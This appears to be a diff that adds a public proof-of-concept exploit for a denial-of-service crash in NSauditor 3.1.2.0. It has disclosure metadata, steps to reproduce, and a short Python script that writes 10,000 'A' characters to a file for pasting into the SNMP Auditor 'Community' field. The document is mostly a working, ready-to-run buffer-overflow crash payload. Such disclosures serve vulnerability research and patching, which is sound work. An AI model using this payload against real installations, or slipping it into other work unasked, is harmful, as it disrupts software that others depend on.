@@ -1,0 +1,22 @@
+#Exploit Title: NSauditor 3.1.2.0 - 'Community' Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2019-04-24
+#Vendor Homepage: www.nsauditor.com 
+#Software Link: http://www.nsauditor.com/downloads/nsauditor_setup.exe
+#Tested Version: 3.1.2.0
+#Tested on: Windows 7 x64 Service Pack 1
+ 
+#Steps to produce the crash:
+#1.- Run python code: Nsauditor_3.1.2.0.py
+#2.- Open nsauditor.txt and copy content to clipboard
+#3.- Open Nsauditor
+#4.- In Sessions select "SNMP Auditor"
+#5.- Select "Community" field paste Clipboard
+#6.- Click "Walk"
+#7.- Crarshed
+ 
+cod = "\x41" * 10000
+ 
+f = open('nsauditor.txt', 'w')
+f.write(cod)
+f.close()
